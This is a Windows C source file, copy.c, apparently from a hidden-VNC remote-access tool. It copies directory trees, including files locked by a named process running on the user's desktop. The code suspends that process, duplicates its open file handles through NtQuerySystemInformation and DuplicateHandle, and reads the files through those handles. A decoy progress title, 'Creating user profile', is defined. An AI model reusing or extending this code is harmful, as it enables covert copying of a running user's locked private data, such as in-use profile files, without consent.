//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: copy.c
// $Revision: 194 $
// $Date: 2014-07-11 16:55:06 +0400 (Пт, 11 июл 2014) $
// description: 
//	routines for copying files and directories including
//	ones locked by some process

#include "project.h"
#include "..\vncdll\pssup.h"
#include <Tlhelp32.h>
#include <malloc.h>
#include "rt\str.h"

#define PROGRESS_TITLE_A "Creating user profile"
#define PROGRESS_TITLE_W L"Creating user profile"

// helper function that copies file to another one
WINERROR _CopyFileByHandleW( HANDLE hSrc, LPWSTR Dst, PVOID IoBuffer, ULONG IoBufferSize )
{
	HANDLE hFile;
	BY_HANDLE_FILE_INFORMATION FileInfo = {0};
	ULONG FileAttributes = FILE_ATTRIBUTE_NORMAL;
	LARGE_INTEGER FilePointer = {0};
	LARGE_INTEGER NewFilePointer = {0};
	BOOL fbResult = TRUE;
	BOOL bRead;
	DWORD BytesRead = 0,BytesWritten = 0;
	WINERROR Error = NO_ERROR;
	
	// get original attributes
	if ( GetFileInformationByHandle( hSrc, &FileInfo ))
	{
		FileAttributes = FileInfo.dwFileAttributes;
	}

	// open using source attributes 
	hFile = CreateFileW( Dst, FILE_GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL );
	if ( hFile == INVALID_HANDLE_VALUE ){
		Error = GetLastError();
		DbgPrint( "[_CopyFileW] %lu=CreateFileW(%ws)\n", Error, Dst );
		return Error;
	}
	// Get current file ptr
	SetFilePointerEx( hSrc, FilePointer, &FilePointer, FILE_CURRENT );

	// seek to the beginning
	SetFilePointerEx( hSrc, NewFilePointer, NULL , FILE_BEGIN );

	// do copy file
	while( TRUE )
	{
		bRead = ReadFile( hSrc, IoBuffer, IoBufferSize, &BytesRead, NULL );
		if ( !BytesRead ){
			break;
		}
		if ( !WriteFile(hFile,IoBuffer,BytesRead,&BytesWritten,NULL) )
		{
			Error = GetLastError();
			DbgPrint( "[_CopyFileByHandleW] %lu=WriteFile(%ws)\n", Error, Dst );
			break;
		}
		BytesRead = 0;
	}

	//TODO: Security desc??

	//reset file ptr
	SetFilePointerEx( hSrc, FilePointer, NULL , FILE_BEGIN );

	// close dest handle
	SetEndOfFile(hFile);
	CloseHandle(hFile);
	if ( Error != NO_ERROR ){
		DeleteFileW(Dst);
	}

	return Error;
}
// helper function that copies file to another one
#define FILE_SHARE_ALL FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE
WINERROR _CopyFileW( LPWSTR Src, LPWSTR Dst, PVOID IoBuffer, ULONG IoBufferSize )
{
	HANDLE hFile;
	ULONG FileAttributes = FILE_ATTRIBUTE_NORMAL | FILE_FLAG_BACKUP_SEMANTICS;
	WINERROR Error = NO_ERROR;

	// try to open using backup semantics 
	hFile = CreateFileW( Src, FILE_GENERIC_READ, FILE_SHARE_ALL, NULL, OPEN_EXISTING, FileAttributes, NULL );
	if ( hFile == INVALID_HANDLE_VALUE ){
		FileAttributes &= ~FILE_FLAG_BACKUP_SEMANTICS;
		hFile = CreateFileW( Src, FILE_GENERIC_READ, FILE_SHARE_ALL, NULL, OPEN_EXISTING, FileAttributes, NULL );
		if ( hFile == INVALID_HANDLE_VALUE ){
			Error = GetLastError();
			DbgPrint( "[_CopyFileW] %lu=CreateFileW(%ws)\n", Error, Src );
			return Error;
		}
	}
	Error = _CopyFileByHandleW( hFile, Dst, IoBuffer, IoBufferSize );
	CloseHandle( hFile );
	return Error;
}

// copies all files from one dir to another
WINERROR _CopyDirectoryW( LPWSTR Src, LPWSTR Dst, PVOID IoBuffer, ULONG IoBufferSize )
{
	WINERROR Error = NO_ERROR;

	WIN32_FIND_DATAW FindFileData;
	HANDLE hFind;
	LPWSTR szSearchPath;
	ULONG SrcLength;
	LPWSTR szDstPath;
	ULONG DstLength;

	do{
		ZeroMemory(&FindFileData,sizeof(FindFileData));

		// store for filter and search path
		SrcLength = lstrlenW(Src);
		szSearchPath = hAlloc( (SrcLength + MAX_PATH)*sizeof(WCHAR) );
		if ( !szSearchPath ){
			DbgPrint( "[_CopyDirectoryW] hAlloc(%lu) failed\n", (SrcLength + MAX_PATH)*sizeof(WCHAR) );
			Error = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}
		lstrcpyW(szSearchPath,Src);
		lstrcatW(szSearchPath,L"\\*");

		// store for dts dir
		DstLength = lstrlenW(Dst);
		szDstPath = hAlloc( (DstLength + MAX_PATH)*sizeof(WCHAR) );
		if ( !szDstPath ){
			DbgPrint( "[_CopyDirectoryW] hAlloc(%lu) failed\n", (DstLength + MAX_PATH)*sizeof(WCHAR) );
			Error = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}
		lstrcpyW(szDstPath,Dst);

		// create dst directory
		if ( !CreateDirectoryW( Dst, NULL ) ){
			Error = GetLastError();
			if ( Error != ERROR_ALREADY_EXISTS ){
				DbgPrint( "[_CopyDirectoryW] %lu=CreateDirectory(%ws)\n", Error, Dst );
				break;
			}
		}

		// cleanup error
		Error = NO_ERROR;

		// Find the first file in the directory.
		hFind = FindFirstFileW(szSearchPath, &FindFileData);
		if (INVALID_HANDLE_VALUE == hFind) {
			Error = GetLastError();
			DbgPrint( "[_CopyDirectoryW] %lu=FindFirstFile(%ws)\n", Error, szSearchPath );
			break;
		}

		// go thu dir and copy files
		do
		{
			if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY){
				if ( ( FindFileData.cFileName[0] == L'.' && FindFileData.cFileName[1] == 0 ) ||
					( FindFileData.cFileName[0] == L'.' && FindFileData.cFileName[1] == L'.' && FindFileData.cFileName[2] == 0))
				{
					continue;
				}
			}
			//construct full names
			szSearchPath[SrcLength] = L'\\';
			lstrcpyW(&szSearchPath[SrcLength+1],FindFileData.cFileName);

			szDstPath[DstLength] = L'\\';
			lstrcpyW(&szDstPath[DstLength+1],FindFileData.cFileName);

			if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY){
				// copy dir recursively 
				Error = _CopyDirectoryW( szSearchPath, szDstPath, IoBuffer, IoBufferSize );
				if ( Error != NO_ERROR ){
					break;
				}
			}
			else{
				// copy file to destination
				Error = _CopyFileW( szSearchPath, szDstPath, IoBuffer, IoBufferSize );
				if ( Error != NO_ERROR ){
					if ( Error != NO_ERROR && Error != ERROR_SHARING_VIOLATION && Error != ERROR_ACCESS_DENIED ){
						DbgPrint( "[_CopyDirectoryW] %lu=_CopyFileW(%ws)\n", Error, Src );
						break;
					}
					Error = NO_ERROR;
				}
			}
		}while (FindNextFileW(hFind, &FindFileData) != 0);
		FindClose(hFind);
	} while ( FALSE );

	if ( szSearchPath ){
		hFree (szSearchPath);
	}

	return Error;
}
//////////////////////////////////////////////////////////////////////////
#define DUPLICATE_SAME_ATTRIBUTES   0x00000004

typedef struct _FILE_AND_HANDLE
{
	struct _FILE_AND_HANDLE *Next;
	HANDLE hFile;
	PFILE_NAME_INFORMATION Name;
}FILE_AND_HANDLE,*PFILE_AND_HANDLE;

//////////////////////////////////////////////////////////////////////////
// opens process on the main desktop (winsta0\default)
HANDLE _OpenRootProcessW( PWSTR ProcessName )
{
	HANDLE hProcessSnap = INVALID_HANDLE_VALUE;
	HANDLE hProcess = NULL;
	PROCESSENTRY32W pe32;
	PWSTR DesktopName;
	BOOL fbFound;

	// Take a snapshot of all processes in the system.
	hProcessSnap = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
	if( hProcessSnap == INVALID_HANDLE_VALUE )
	{
		DbgPrint( "CreateToolhelp32Snapshot (of processes) failed err=%lu\n", GetLastError());
		return NULL;
	}

	// Set the size of the structure before using it.
	pe32.dwSize = sizeof( PROCESSENTRY32W );

	// Retrieve information about the first process,
	// and exit if unsuccessful
	if( !Process32FirstW( hProcessSnap, &pe32 ) )
	{
		DbgPrint( "Process32First failed err=%lu\n", GetLastError());
		CloseHandle( hProcessSnap );          // clean the snapshot object
		return NULL;
	}

	// Now walk the snapshot of processes, and
	// display information about each process in turn
	do
	{
		if ( lstrcmpiW (pe32.szExeFile,ProcessName) == 0 )
		{
			hProcess = OpenProcess( PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_SUSPEND_RESUME, FALSE, pe32.th32ProcessID );
			if( hProcess == NULL ){
				hProcess = OpenProcess( PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID );
			}
			if( hProcess != NULL )
			{
				DesktopName = PsSupGetProcessDesktopName(hProcess);
				if ( DesktopName )
				{
					fbFound = ( lstrcmpiW(DesktopName, L"Winsta0\\Default") == 0 );
					hFree ( DesktopName );
					if ( fbFound )
					{
						//found
						break;
					}
				}
				CloseHandle( hProcess );
				hProcess = NULL;
			}else{
				DbgPrint( "OpenProcess failed err=%lu\n", GetLastError());
			}
		}
	} while( Process32NextW( hProcessSnap, &pe32 ) );

	CloseHandle( hProcessSnap );
	return hProcess;
}

HANDLE _OpenRootProcessA( PSTR ProcessName )
{
	USES_CONVERSION;
	return _OpenRootProcessW(A2W(ProcessName));
}

PFILE_AND_HANDLE _GetOpenedFilesForDir( HANDLE hProcess, LPWSTR DirectoryName )
{
	DWORD ProcessID = GetProcessId( hProcess );
	PULONG Buffer;
	ULONG BufferSize  = 0x100000;
	PSYSTEM_HANDLE_INFORMATION HandleInfo;
	NTSTATUS ntStatus;
	ULONG i;

	PFILE_NAME_INFORMATION oni = NULL;
	POBJECT_TYPE_INFORMATION oti = NULL;
	OBJECT_BASIC_INFORMATION obi;
	UNICODE_STRING FileType;
	FILE_STANDARD_INFORMATION fsi;

	HANDLE hObject;
	ULONG ReturnedLength = 0;
	ULONG otiSize = 0;
	ULONG oniSize = 0;

	SIZE_T DirectoryNameLen;

	PFILE_AND_HANDLE ListHead = NULL;

	// shift dir name
	// c:\dirname\dir2->\dirname\dir2
	DirectoryName = DirectoryName+2;
	DirectoryNameLen = lstrlenW(DirectoryName);

	Buffer = hAlloc(BufferSize);
	if ( !Buffer ){
		DbgPrint( "hAlloc(%lu) failed\n",BufferSize);
		return NULL;
	}

	while (NtQuerySystemInformation(SystemHandleInformation, Buffer, BufferSize, 0)== STATUS_INFO_LENGTH_MISMATCH){
		hFree ( Buffer );
		BufferSize = BufferSize * 2;
		Buffer = hAlloc(BufferSize);
		if ( !Buffer ){
			DbgPrint( "hAlloc(%lu) failed\n",BufferSize);
			return NULL;
		}
	}

	HandleInfo = (PSYSTEM_HANDLE_INFORMATION)Buffer;

	for ( i = 0; i < HandleInfo->uCount; i++ ) {

		if ( HandleInfo->aSH[i].uIdProcess != ProcessID ){
			continue;
		}

		if ( !DuplicateHandle(
				hProcess, 
				(HANDLE)HandleInfo->aSH[i].Handle, 
				GetCurrentProcess(), 
				&hObject,
				0 ,FALSE, DUPLICATE_SAME_ACCESS
				))
		{
			DbgPrint( "%lu=DuplicateHandle\n",GetLastError());
			continue;
		}

		ntStatus = NtQueryObject(hObject, ObjectBasicInformation, &obi, sizeof obi, &ReturnedLength);
		if ( !NT_SUCCESS(ntStatus)) {
			DbgPrint( "%08X=NtQueryObject\n",ntStatus);
			CloseHandle( hObject );
			continue;
		}

		// reallocate buffers if needed
		if ( otiSize < obi.TypeInformationLength + 2 ){
			if ( oti ){
				hFree( oti );
			}
			otiSize = obi.TypeInformationLength + 2;
			oti = hAlloc( otiSize );
			if ( !oti ) {
				DbgPrint( "hAlloc(%lu) failed\n",otiSize);
				otiSize = 0;
				CloseHandle( hObject );
				continue;
			}
		}

		if ( obi.NameInformationLength == 0 ){
			obi.NameInformationLength = (MAX_PATH + 1 )* sizeof (WCHAR);
		}

		if ( oniSize < obi.NameInformationLength + 2 ){
			if ( oni ){
				hFree( oni );
			}
			oniSize = (obi.NameInformationLength == 0 ) ? MAX_PATH * sizeof (WCHAR): obi.NameInformationLength + 2;
			oni = hAlloc( oniSize );
			if ( !oni ) {
				DbgPrint( "hAlloc(%lu) failed\n",oniSize);
				oniSize = 0;
				CloseHandle( hObject );
				continue;
			}
		}

		ntStatus = 
			NtQueryObject(
				hObject, 
				ObjectTypeInformation, 
				oti, 
				otiSize, 
				&ReturnedLength
				);

		if ( NT_SUCCESS(ntStatus)) {
			RtlInitUnicodeString(&FileType,L"File");

			if ( RtlEqualUnicodeString(&FileType,&oti->Name,TRUE) )
			{
				IO_STATUS_BLOCK IoStatus;

				ntStatus = 
					NtQueryInformationFile( 
						hObject, 
						&IoStatus, 
						&fsi,sizeof(fsi), 
						FileStandardInformation 
						);

				if ( NT_SUCCESS(ntStatus) && !fsi.Directory && !fsi.DeletePending) {

					ntStatus = 
						NtQueryInformationFile( 
							hObject, 
							&IoStatus, 
							oni,oniSize, 
							FileNameInformation
							);

					if ( NT_SUCCESS(ntStatus))
					{
						if ( oni->FileNameLength/sizeof(WCHAR) >= DirectoryNameLen )
						{
							oni->FileName[oni->FileNameLength/sizeof(WCHAR)] = 0;
							if ( _wcsnicmp(DirectoryName,oni->FileName, DirectoryNameLen ) == 0 )
							{
								PFILE_AND_HANDLE ListEntry = hAlloc( sizeof(FILE_AND_HANDLE));
								if ( ListEntry )
								{
									ListEntry->hFile = hObject;
									ListEntry->Name = oni;

									hObject = NULL;
									ListEntry->Next = ListHead;
									ListHead = ListEntry;

									// reallocate later
									oni = NULL;
									oniSize = 0;
								}
							}
						}

					}else {
						DbgPrint( "%08X=NtQueryInformationFile(name) failed\n",ntStatus);
					}

				}else if (!NT_SUCCESS(ntStatus)){
					DbgPrint( "%08X=NtQueryInformationFile(standard) failed\n",ntStatus);
				}
			}
		}else{
			DbgPrint( "%08X=NtQueryObject failed\n",ntStatus);
		}
		if ( hObject ){
			CloseHandle(hObject);
		}
	}
	if ( oti ){
		hFree ( oti );
	}
	if ( oni ){
		hFree ( oni );
	}
	if ( Buffer ){
		hFree ( Buffer );
	}
	return ListHead;
}
//////////////////////////////////////////////////////////////////////////
// removes directory including files and subdirectories
BOOL XRemoveDirectoryW( LPWSTR szPath, LPWSTR Pattern, BOOL bRemoveDir)
{
	LPWSTR szFileName;
	ULONG FileNamLen;
	HANDLE hFind;
	WIN32_FIND_DATAW FindData = {0}; 
	int iDeleted = -1;

	FileNamLen = (lstrlenW(szPath)+1 + lstrlenW(Pattern) + 1)*sizeof(WCHAR); // dir\\pattern \0
	szFileName = hAlloc(FileNamLen+MAX_PATH*sizeof(WCHAR));
	if ( szFileName ){
		lstrcpyW(szFileName,szPath);
		lstrcatW(szFileName,L"\\");
		lstrcatW(szFileName,Pattern);

		memset(&FindData, 0, sizeof(WIN32_FIND_DATAW));

		// Searching for files within the current directory first
		while ( iDeleted && (hFind = FindFirstFileW(szFileName, &FindData)) != INVALID_HANDLE_VALUE)
		{
			iDeleted = 0;
			do
			{
				if (lstrcmpW(FindData.cFileName,L".") == 0 )
					continue;

				if (lstrcmpW(FindData.cFileName,L"..") == 0 )
					continue;

				// Skipping large files
				if ( ( FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY ) == FILE_ATTRIBUTE_DIRECTORY ){
					lstrcpyW(szFileName,szPath);
					lstrcatW(szFileName,L"\\"); 
					lstrcatW(szFileName,FindData.cFileName);
					if ( XRemoveDirectoryW( szFileName, L"*", TRUE ) ){
						iDeleted ++;
					}
					continue;
				}

				lstrcpyW(szFileName,szPath);
				lstrcatW(szFileName,L"\\"); 
				lstrcatW(szFileName,FindData.cFileName);
				if ( DeleteFileW( szFileName )){
					iDeleted ++;
				}
			} while(FindNextFileW(hFind, &FindData));

			FindClose(hFind);

			// restart
			lstrcpyW(szFileName,szPath);
			lstrcatW(szFileName,L"\\");
			lstrcatW(szFileName,Pattern);
			memset(&FindData, 0, sizeof(WIN32_FIND_DATAW));
		}
	}
	//szPath[lstrlenA(szPath)-1] = '\0'; // remove slash
	if ( bRemoveDir ){
		return RemoveDirectoryW(szPath);
	}
	return TRUE;
}

BOOL XRemoveDirectoryA( LPSTR szPath, LPSTR Pattern, BOOL bRemoveDir)
{
	USES_CONVERSION;
	return XRemoveDirectoryW( A2W(szPath), A2W(Pattern), bRemoveDir);
}

// interface functions for coping directory tree
WINERROR XCopyDirectoryW( LPWSTR Src, LPWSTR Dst )
{
	DWORD Error = NO_ERROR;
	PCHAR IoBuffer;
	ULONG IoBufferSize = 0x10000;

	//create IO buffer
	IoBuffer = hAlloc( IoBufferSize );
	if ( !IoBuffer ){
		Error = ERROR_NOT_ENOUGH_MEMORY;
	}else{
		Error = _CopyDirectoryW( Src, Dst, IoBuffer, IoBufferSize );
		hFree (IoBuffer);
	}
	return Error;
}

WINERROR XCopyDirectoryA( LPSTR Src, LPSTR Dst )
{
	USES_CONVERSION;
	return XCopyDirectoryW( A2W(Src), A2W(Dst) );
}

// interface functions for coping directory tree
//including files locked by specified process
WINERROR XCopyDirectorySpecifyProcessW( LPWSTR ProcessName, LPWSTR Src, LPWSTR Dst )
{
	PCHAR IoBuffer;
	ULONG IoBufferSize = 0x10000;
	HANDLE hProcess;
	PFILE_AND_HANDLE FileList;
	PFILE_AND_HANDLE Entry;

	LPWSTR SrcPrefix; // cut C:
	ULONG  SrcPrefixLen;
	LPWSTR DstFileName = NULL;
	ULONG DstFileNameLength = 0;
	ULONG  DstLen;
	BOOL bSuspended = FALSE;
	DWORD Error;

	//create IO buffer
	IoBuffer = hAlloc( IoBufferSize );
	if ( !IoBuffer ){
		return ERROR_NOT_ENOUGH_MEMORY;
	}

	//trim 
	StrTrimW(Src, L" \\");
	StrTrimW(Dst, L" \\");

	SrcPrefix = Src + 2; // cut C:
	SrcPrefixLen = lstrlenW(SrcPrefix);
	DstLen = lstrlenW(Dst);

	// lookup process by name
	hProcess = _OpenRootProcessW( ProcessName );

	// suspend process
	if ((hProcess) && (PsSupSuspendProcess(hProcess) == NO_ERROR))
		bSuspended = TRUE;

	// copy tree
	Error = _CopyDirectoryW( Src, Dst, IoBuffer, IoBufferSize );

	//copy locked files
	if ( (Error == NO_ERROR ) && hProcess ){
		FileList = _GetOpenedFilesForDir( hProcess, Src );
		// walk the list
		while ( FileList )
		{
			Entry = FileList;
			FileList = Entry->Next;
			if ( Entry->hFile ){
				// construct destination
				LPWSTR FileName = Entry->Name->FileName + SrcPrefixLen;
				ULONG FileNameLength = Entry->Name->FileNameLength/sizeof(WCHAR) - SrcPrefixLen;

				// realloc file name buffer
				if ( DstFileNameLength < DstLen + FileNameLength + 2){
					if ( DstFileName ){
						hFree (DstFileName );
					}
					DstFileNameLength = DstLen + FileNameLength + 2;
					DstFileName = hAlloc ( DstFileNameLength*sizeof(WCHAR) );
					if ( DstFileName == NULL ){
						DstFileNameLength = 0;
					}else{
						lstrcpyW(DstFileName,Dst);
					}
				}
				if ( DstFileName )
				{
					lstrcpyW(&DstFileName[DstLen],FileName);
					// copy file
					DbgPrint( "_CopyFileByHandleW %ws -> %ws\n",Entry->Name->FileName,DstFileName);
					_CopyFileByHandleW( Entry->hFile, DstFileName, IoBuffer, IoBufferSize );
				}
				CloseHandle( Entry->hFile );
			}
			if ( Entry->Name ){
				hFree(Entry->Name);
			}
			hFree ( Entry );
		}
	}

	// resume process
	if ( hProcess ){
		if ( bSuspended ){
			PsSupResumeProcess(hProcess);
		}
		CloseHandle( hProcess );
	}

	hFree (IoBuffer);
	return Error;
}